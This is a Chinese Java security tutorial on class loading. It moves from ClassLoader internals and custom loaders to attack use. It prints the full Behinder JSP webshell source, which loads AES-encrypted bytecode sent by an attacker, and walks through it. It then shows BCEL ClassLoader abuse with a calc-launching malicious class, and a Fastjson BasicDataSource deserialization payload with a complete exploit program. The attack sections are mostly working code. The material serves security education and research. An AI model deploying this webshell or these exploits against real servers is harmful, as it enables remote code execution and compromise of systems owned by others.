# java安全中的类加载
> 提前声明：本文所涉及的内容仅供参考与教育目的，旨在普及网络安全相关知识。其内容不代表任何机构、组织或个人的权威建议，亦不构成具体的操作指南或法律依据。作者及发布平台对因使用本文信息直接或间接引发的任何风险、损失或法律纠纷不承担责任。
## 一、 ClassLoader(类加载机制)

 Java是一个依赖于JVM（Java虚拟机)实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的 native方法（defineclass0/1/2)来定义一个java.lang.Class实例。

```java
    /**
     * Defines a class of the given flags via Lookup.defineClass.
     *
     * @param loader the defining loader
     * @param lookup nest host of the Class to be defined
     * @param name the binary name or {@code null} if not findable
     * @param b class bytes
     * @param off the start offset in {@code b} of the class bytes
     * @param len the length of the class bytes
     * @param pd protection domain
     * @param initialize initialize the class
     * @param flags flags
     * @param classData class data
     */
    static native Class<?> defineClass0(ClassLoader loader,
                                        Class<?> lookup,
                                        String name,
                                        byte[] b, int off, int len,
                                        ProtectionDomain pd,
                                        boolean initialize,
                                        int flags,
                                        Object classData);

	static native Class<?> defineClass1(ClassLoader loader, String name, byte[] b, int off, int len,
                                        ProtectionDomain pd, String source);
	static native Class<?> defineClass2(ClassLoader loader, String name, java.nio.ByteBuffer b,
                                        int off, int len, ProtectionDomain pd,String source);
```

可以看到这是classloader类中的三个native方法，三个方法是 Java 虚拟机（JVM）中用于动态定义类的本地方法（Native Methods），它们没有方法体，因为它们的实现是由 JVM 在底层（通常是 C/C++ 代码）提供的。这些方法的主要作用是允许 Java 程序在运行时动态加载和定义类，而不是在编译时静态加载。

主要流程图：

![image-20250208120302045](https://gitee.com/ling-x5/img/raw/master/image-20250208120302045.png)

```
1.字节码解析：

JVM 会解析传入的字节码（无论是 byte[] 还是 ByteBuffer），验证其是否符合 Java 类文件格式（Class File Format）。
如果字节码无效，JVM 会抛出 ClassFormatError。

2.类加载：

JVM 会创建一个内部类结构（Klass），并将其注册到类加载器（ClassLoader）的类表中。
如果类已经存在，JVM 会抛出 LinkageError。

3.安全验证：

JVM 会检查 ProtectionDomain，确保类加载操作符合安全管理器的要求。
如果安全验证失败，JVM 会抛出 SecurityException。

4.初始化：

如果 initialize 参数为 true，JVM 会执行类的静态初始化块（<clinit>）。

5.返回类对象：

最终，JVM 会返回一个 Class<?> 对象，表示新定义的类。
```

**ClassLoader类有如下核心方法：**

> 1.loadclass(加载指定的Java类)
> 2.findClass(查找指定的Java类)
> 3.findLoadedclass(查找JVM已经加载过的类)
> 4.defineclass(定义一个Java类)
> 5.resolveC1ass(链接指定的Java类)

Java类加载方式分为`显式`和`隐式`，显式即我们通常使用Java反射或者ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。

## 二、以helloword为例

理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习 `ClassLoader`。

`ClassLoader` 加载 `HelloWorld` 类重要流程如下：

1. `ClassLoader` 会调用 `public Class<?> loadClass(String name)` 方法加载 `HelloWorld` 类。
2. 调用 `findLoadedClass` 方法检查 `TestHelloWorld` 类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。
3. 如果创建当前 `ClassLoader` 时传入了父类加载器（ `new ClassLoader(父类加载器)`）就使用父类加载器加载 `HelloWorld` 类，否则使用JVM的 `Bootstrap ClassLoader` 加载。
4. 如果上一步无法加载 `HelloWorld` 类，那么调用自身的 `findClass` 方法尝试加载 `HelloWorld` 类。
5. 如果当前的 `ClassLoader` 没有重写了 `findClass` 方法，那么直接返回类加载失败异常。如果当前类重写了 `findClass` 方法并通过传入的 `HelloWorld` 类名找到了对应的类字节码，那么应该调用 `defineClass` 方法去JVM中注册该类。
6. 如果调用 `loadClass` 的时候传入的 `resolve` 参数为true，那么还需要调用 `resolveClass` 方法链接类，默认为false。
7. 返回一个被JVM加载后的 `java.lang.Class` 类对象。

## 三、自定义classloader

我们看一个示例

### 1、testclassloader文件

```
import java.lang.reflect.Method;

public class testClassloader extends ClassLoader{
    // 定义类名称
    public static String CLASS_NAME = "HelloWorld";
    // 定义类字节码
    public static byte[] CLASS_BYTES = new byte[]{-54, -2, -70, -66, 0, 0, 0, 61, 0, 17, 10, 0, 2,
            0, 3, 7, 0, 4, 12, 0, 5, 0, 6, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47,
            79, 98, 106, 101, 99, 116, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86,
            8, 0, 8, 1, 0, 13, 72, 101, 108, 108, 111, 44, 32, 87, 111, 114, 108, 100, 33, 7, 0,
            10, 1, 0, 10, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 4, 67, 111, 100,
            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1,
            0, 10, 104, 101, 108, 108, 111, 119, 111, 114, 108, 100, 1, 0, 20, 40, 41, 76, 106, 97,
            118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111,
            117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 15, 72, 101, 108, 108, 111, 87, 111, 114,
            108, 100, 46, 106, 97, 118, 97, 0, 33, 0, 9, 0, 2, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6,
            0, 1, 0, 11, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 12,
            0, 0, 0, 6, 0, 1, 0, 0, 0, 1, 0, 1, 0, 13, 0, 14, 0, 1, 0, 11, 0, 0, 0, 27, 0, 1, 0, 1,
            0, 0, 0, 3, 18, 7, -80, 0, 0, 0, 1, 0, 12, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 1, 0, 15, 0,
            0, 0, 2, 0, 16};
    // 重写findClass方法
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // 如果类名称匹配
        if (CLASS_NAME.equals(name)) {
            // 返回类字节码
            return defineClass(name, CLASS_BYTES, 0, CLASS_BYTES.length);
        }
        // 否则调用父类方法
        return super.findClass(name);
    }

    public static void main(String[] args) {
        // 创建自定义类加载器
        testClassloader loader = new testClassloader();
        try{
            // 使用加载器加载HelloWorld类
            Class<?> aClass = loader.loadClass(CLASS_NAME);
            // 利用类反射创建HelloWorld对象
            Object instance = aClass.getDeclaredConstructor().newInstance();
            // 反射获取helloworld方法
            Method method = instance.getClass().getMethod("helloworld");
            // 反射调用helloworld方法
            String str = (String)method.invoke(instance);
            System.out.println(str);

        }catch (Exception e){
            System.out.println(e);
        }
    }

}
```

> 这里CLASS_BYTES是HelloWord.java编译出来的class文件的字节码数组

### 2、HelloWord文件

```
public class HelloWorld {
    public void helloworld() {
        System.out.println("Hello World!");
    }
}
```

这里就简单定义了一个helloworld()方法，编译为class文件

### 3、class2Bytes文件

这个文件实现把class转化为byte数组的功能，封装了一个转化方法将字节码转化为数组

```java
package classLoader;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Arrays;

public class Class2Bytes {
    public  byte[] class2bytes(File classFile) {
        try {FileInputStream fis = new FileInputStream(classFile);
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int bytesRead = 0;
            byte[] bytes = new byte[4096];
            while ((bytesRead = fis.read(bytes, 0, 4096)) != -1) {
                baos.write(bytes, 0, bytesRead);
            }
            byte[] classBytes = baos.toByteArray();
            return classBytes;
        } catch (Exception e) {
            System.out.println("转换出错: " + e.getMessage());
            e.printStackTrace();
        }
        return null;
    }
}
```



### 4、执行结果

![image-20250208184445863](https://gitee.com/ling-x5/img/raw/master/image-20250208184445863.png)

而最终的结果是只需要一个`testClassloader`文件，就可以直接运行输出Hello, World!

classloader类加载器把`CLASS_BYTES`这个数组（HelloWorld.class文件内容）直接加载进了jvm虚拟机，通过类反射的操作进行`HelloWorld对象`实例化和`helloworld()`方法的调用

## 四、ClassLoader隔离机制

### 核心概念

1. **类加载器父子关系**  

   创建类加载器时可指定父类加载器。默认遵循**双亲委派模型**（优先委派父类加载器加载类）。

2. **类加载隔离条件**  
   若两个类加载器**无父子关系**且未共享父类加载器，则它们可以加载**同名类**（例如从相同路径加载的 `User.class`），但会被 JVM 视为**完全不同的类**。

3. **跨类加载器调用限制**  
   同级类加载器（无父子关系的平级类加载器）加载的类：

   - 无法直接通过类型转换或静态引用访问对方的类。
   - 必须通过**反射**获取目标类的 `Class` 对象，再动态调用方法。

---

### 示例

```java
// 类加载器 A 加载的类
ClassLoader loaderA = new CustomClassLoader(parentLoader);
Class<?> classA = loaderA.loadClass("com.example.Demo");

// 类加载器 B 加载的类
ClassLoader loaderB = new CustomClassLoader(parentLoader);
Class<?> classB = loaderB.loadClass("com.example.Demo");

// 以下操作会失败：类类型不兼容
// Demo objA = (Demo) classA.newInstance(); 

// 必须通过反射调用
Object instanceA = classA.newInstance();
Method method = classA.getMethod("execute");
method.invoke(instanceA);
```

### 分析

**类的身份 = 类加载器 + 全限定类名。**

1. **类加载器的隔离性**  
   
   - **每个类加载器拥有独立的命名空间**，即使两个类加载器共享同一个父类加载器，它们加载的类也**互不干扰**。  
   - JVM 通过「类全限定名 + 类加载器」的组合唯一标识一个类。  
   
2. **示例中的实际内存状态**  
   
   - `loaderA` 加载的 `Demo` 类 → 记为 `Demo@LoaderA`  
   - `loaderB` 加载的 `Demo` 类 → 记为 `Demo@LoaderB`  
   - **两个类在 JVM 中独立存在**，彼此不可见，也不会被覆盖。  
   
3. **为什么强制转换失败？**  
   
   ```java
   Demo demoA = (Demo) instanceA; // 实际等价于：
   Demo@SystemClassLoader demoA = (Demo@SystemClassLoader) instanceA;

## 五、JSP自定义类加载后门

以冰蝎为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的equals方法实现恶意攻击，其中equals方法传入的pageContext对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。

### **冰蝎源码**

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%><%
    if (request.getMethod().equals("POST")) {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u", k);
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```

从冰蝎的源码不难看出，他就是基于classloader原理开发的后门文件。

### 源码分度解析

最后一行调用的方法比较多我们拆开来看

```java
Cipher c = Cipher.getInstance("AES");
c.init(2, new SecretKeySpec(k.getBytes(), "AES")); // 2对应解密模式（Cipher.DECRYPT_MODE）
```

- **初始化Cipher**：使用AES算法创建解密实例，模式为`Cipher.DECRYPT_MODE`（值2）。

- **密钥规范**：通过`SecretKeySpec`将字符串密钥转换为AES所需的密钥格式。

```java
byte[] encryptedData = new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine());
byte[] decryptedData = c.doFinal(encryptedData); // AES解密
```

- **读取请求体**：从POST请求中读取一行Base64编码的加密数据。
- **解密数据**：使用AES密钥解密数据，得到原始的字节码（`.class`文件内容）。

```java
ClassLoader customLoader = new U(this.getClass().getClassLoader());
Class maliciousClass = customLoader.g(decryptedData); // 调用defineClass加载类
Object instance = maliciousClass.newInstance(); // 实例化类
instance.equals(pageContext); // 触发恶意代码
```

- **自定义类加载器**：通过继承`ClassLoader`的`U`类绕过安全限制，暴露`defineClass`方法。
- **加载恶意类**：将解密后的字节码动态加载为Java类。
- **执行代码**：实例化类并调用`equals`方法，传入`pageContext`对象（提供JSP上下文，便于攻击者操作）。

## 六、BCEL ClassLoader

> 正常的classloader加载类时，要有两部分CLASS_NAME和CLASS_BYTES
>
> BCEL Classloader特性：可以将名称直接加载为类

BCEL（Apache Commons BCE）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名 org.apache.bcel.util.ClassLoader 为 com.sun.org.apache.bcel.internal.util.ClassLoader，BCEL的类加载器在解析类名时会对ClassName中有 $$BCEL$$标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。

### 流程

```
       [特殊类名]  
         ↓  
$$BCEL$$ + EncodedBytecode  
         ↓  
   解码为字节数组 (byte[])  
         ↓  
  defineClass() → JVM Class
```

### BCEL攻击原理

当BCEL的 com.sun.org.apache.bcel.internal.util.ClassLoader的loadClass()方法 加载一个类名中带有 $$BCEL$$的类时会截取出 $$BCEL$$后面的字符串，然后使用 com.sun.org.apache.bcel.internal.classfile.Utility的decode()方法将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用 defineClass 注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。

**源码**

关键的两个方法

```java
protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException {
    Class cl = null;
    if ((cl = (Class)this.classes.get(class_name)) == null) {
        for(int i = 0; i < this.ignored_packages.length; ++i) {
            if (class_name.startsWith(this.ignored_packages[i])) {
                cl = this.getParent().loadClass(class_name);
                break;
            }
        }

        if (cl == null) {
            JavaClass clazz = null;
            if (class_name.indexOf("$$BCEL$$") >= 0) {
                clazz = this.createClass(class_name);  // 调用createClass
            } else {
                if ((clazz = this.repository.loadClass(class_name)) == null) {
                    throw new ClassNotFoundException(class_name);
                }

                clazz = this.modifyClass(clazz);
            }

            if (clazz != null) {
                byte[] bytes = clazz.getBytes();
                cl = this.defineClass(class_name, bytes, 0, bytes.length);
            } else {
                cl = Class.forName(class_name);
            }
        }

        if (resolve) {
            this.resolveClass(cl);
        }
    }

    this.classes.put(class_name, cl);
    return cl;
}

protected JavaClass createClass(String class_name) {

    int index = class_name.indexOf("$$BCEL$$");
    // 截取类名
    String real_name = class_name.substring(index + 8);
    JavaClass clazz = null;

    try {
        // 解码类名
        byte[] bytes = Utility.decode(real_name, true);
        // 转化为实例
        ClassParser parser = new ClassParser(new ByteArrayInputStream(bytes), "foo");
        clazz = parser.parse();
    } catch (Throwable var8) {
        Throwable e = var8;
        e.printStackTrace();
        return null;
    }

    ConstantPool cp = clazz.getConstantPool();
    ConstantClass cl = (ConstantClass)cp.getConstant(clazz.getClassNameIndex(), (byte)7);
    ConstantUtf8 name = (ConstantUtf8)cp.getConstant(cl.getNameIndex(), (byte)1);
    name.setBytes(class_name.replace('.', '/'));
    return clazz;
}
```

### BCEL编码

调用bcel编码方法，对class字节码文件进行编码

```
public static String bcelEncode(File classFile) throws IOException {
		return "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
	}
```

### BCEL解码

解码在com.sun.org.apache.bcel.internal.util.ClassLoader的createClass()方法中

```
int index = class_name.indexOf("$$BCEL$$");
String real_name = class_name.substring(index + 8);
byte[] bytes = Utility.decode(real_name, true);
```

### 攻击示例

我们准备一个evilClass类，比较简单。就是在实例化的时候会执行打开计算器命令

```javapackage BCEL;
public class evilClass {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /*
    public static void main(String[] args) {
        evilClass evil = new evilClass();
    }
    */
}
```

把它编译为class字节码

![image-20250210185100126](https://gitee.com/ling-x5/img/raw/master/image-20250210185100126.png)



我们通过BCEL加载到JVM，并实例化执行

testBCELClassLoader代码

```java
package BCEL;

import classLoader.Class2Bytes;
import org.apache.bcel.classfile.Utility;
import org.apache.bcel.util.ClassLoader;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;

public class testBCELClassLoader {
    /**
     * 将class文件转成字节数组，并使用BCEL进行编码
     * @param classFile
     * @return
     * @throws IOException
     */
    public String BCELencode(File classFile) throws Exception {
        Class2Bytes class2Bytes = new Class2Bytes();
        byte[] bytes = class2Bytes.class2bytes(classFile);
//        System.out.println(Arrays.toString(bytes));
        String ClassName = "$$BCEL$$" +  Utility.encode(bytes, true);
        return ClassName;
    }
    /**
     * 使用BCEL类加载器加载恶意类
     * @param ClassName
     * @throws Exception
     */
    public void testClassLoader(String ClassName) throws Exception {
        // 创建BCEL类加载器
        ClassLoader BCELClassLoader = new ClassLoader();
        // 加载获得类实例，同时执行恶意代码 evilClass  1,2,3三种反射实例化类的方法都是可行的
        // 1
        /*Class.forName(ClassName, true, BCELClassLoader);*/
        // 2
        /*Class<?> clazz = BCELClassLoader.loadClass(ClassName);
        clazz.getDeclaredConstructor().newInstance();*/
        // 3
        BCELClassLoader.loadClass(ClassName).newInstance();
    }
    public static void main(String[] args) throws Exception {

        testBCELClassLoader testBCELClassLoader = new testBCELClassLoader();
        String ClassName = testBCELClassLoader.BCELencode(new File("src/main/java/BCEL/evilClass.class"));
        System.out.println(ClassName);
        testBCELClassLoader.testClassLoader(ClassName);
    }
}
```

### 结果

成功执行了evil类中的命令

![image-20250210194225170](https://gitee.com/ling-x5/img/raw/master/image-20250210194225170.png)

## 七、BCEL Fastjson链条分析

Fastjson（1.1.15 - 1.2.4）可以使用其中有个dbcp的Payload就是利用了BCEL攻击链

### 攻击代码示例

```
{
  "@type": "org.apache.commons.dbcp.BasicDataSource",
  "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$ffeP$c9N$CA$U$acf$9b$c5a$X$dc$b7$93$c0$B$3e$A$f4B$f4$o$8a$R$a2$e7$a6$ed$90$c6a$86$cc$M$84$3f$f2$cc$F$8d$H$3f$c0$8f2$be$99$Q$m$b1$P$af$bb$aa_$d5$5b$7e$7e$bf$be$B$5c$e1$dcD$Mq$N$J$LI$a4$Yr$p$3e$e3$N$9b$3b$c3Fw0$92$o$60H$b5$94$a3$82k$86x$a5$falB$87$a1$c1$b4$b0$D$8b$n$bfI$7f$9a$3a$81$gK$Gs$u$835$uU$aa$9d$7f9M$j$Z$G$5dp$5b$d4$e5$5c$86$9e9$Ly$U$Y$S$84$F$c3eeK$d5$L$3c$e5$M$9b$dbF$8f$9e$x$a4$ef75$ec2$U7$fc$cd$5c$c8I$a0$5c$c7D$Re$L$7b$e1L$d9$J$e9$83$5e$c0$c5$5b$df$e3Bj8$600$e4L$d9m$9b$fb$3e$Vm$bb$af$d4k$b6$a3$i$f90$j$P$a4$d7$e7$D$9b$Y$bd$r$ec$d5$f0$e9H$7f$cf$t$ab$_$b3$e7N$3d$noU$I2k$b3z$d8$L$$$b0Ok$NO$M$y$5c$y$c5CB$tt3$ba$93$b5$P$b0$F$3d$Y$8e$u$a6$o2Nk8$5e$a7v$p$vP$f8$84VH$_$91$7dy$87$7eW$5b$a2$b4$88x$D$W$8d$Y$8b$f4e$w$R$ba$Y$R$ab$nMNy$98T$O$84b$j$N$c5$E$89N$a3$7e$ce$fe$A$Pu$k$Y$fc$B$A$A",
  "driverClassLoader": {
    "@type": "org.apache.bcel.util.ClassLoader"
  }
}
```



FastJson自动调用setter方法修改 org.apache.commons.dbcp.BasicDataSource 类的 driverClassName 和 driverClassLoader 值，driverClassName 是经过BCEL编码后的 com.anbai.sec.classLoader.TestBCELClass 类字节码，driverClassLoader 是一个由FastJson创建的 org.apache.bcel.util.ClassLoader 实例。

Fastjson在autotype开启时，碰到@type字段时，会实例化相应的类，并把后续的字段按照`属性:值`的形式在类中进行封装

BasicDataSource 类的主要漏洞代码：

![image-20250211075655177](https://gitee.com/ling-x5/img/raw/master/image-20250211075655177.png)

![image-20250211080530219](https://gitee.com/ling-x5/img/raw/master/image-20250211080530219.png)

> **`BasicDataSource类`** 
>  实现了 `javax.sql.DataSource` 接口，部分版本在属性注入完成后（如 `driverClassName` 设置），会自动尝试初始化驱动以验证配置有效性。当 `driverClassName` 被注入时，`BasicDataSource` 可能直接尝试加载驱动类（通过 `Class.forName()`），从而触发`createConnectionFactory()`。

### 完整调用链

```
JSON.parseObject()
  → 反序列化 BasicDataSource 对象
    → 注入 driverClassLoader=BCEL ClassLoader
    → 注入 driverClassName=$$BCEL$$... 
    → BasicDataSource 初始化触发 createConnectionFactory()
      → Class.forName(driverClassName, true, driverClassLoader)
        → BCEL ClassLoader 加载并初始化恶意类
          → 静态代码块/构造函数中的代码被执行
```

### 完整EXP

```java
package BCEL;

import classLoader.Class2Bytes;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.bcel.classfile.Utility;

import java.io.File;
import java.util.LinkedHashMap;
import java.util.Map;

public class fastjsonRCE {
    public static void main(String[] args) throws Exception {
        // 构造BCEL特定格式的名称字符串
        byte[] bytes = new Class2Bytes().class2bytes(new File("src/main/java/BCEL/evilClass.class"));
        String ClassName = "$$BCEL$$" +  Utility.encode(bytes, true);
        System.out.println(ClassName);
        // 创建一个Map对象, 用于存储要序列化的数据
        Map<String, Object> exp = new LinkedHashMap<>();
        exp.put("@type", "org.apache.commons.dbcp.BasicDataSource");
        exp.put("driverClassName",ClassName);
        // 创建Map对象，存放BCELclassloader
        Map<String, Object> bcel = new LinkedHashMap<>();
        bcel.put("@type", "org.apache.bcel.util.ClassLoader");
        
        exp.put("driverClassLoader", bcel);
        String strExp = JSON.toJSONString(exp);
        System.out.println(strExp);
        JSONObject jsonObject = JSON.parseObject(strExp);
        System.out.println(jsonObject);


    }
}
```

### 结果

看到弹出计算机成功

![image-20250211082606750](https://gitee.com/ling-x5/img/raw/master/image-20250211082606750.png)


参考文章

https://www.javasec.org/javase/ClassLoader/






















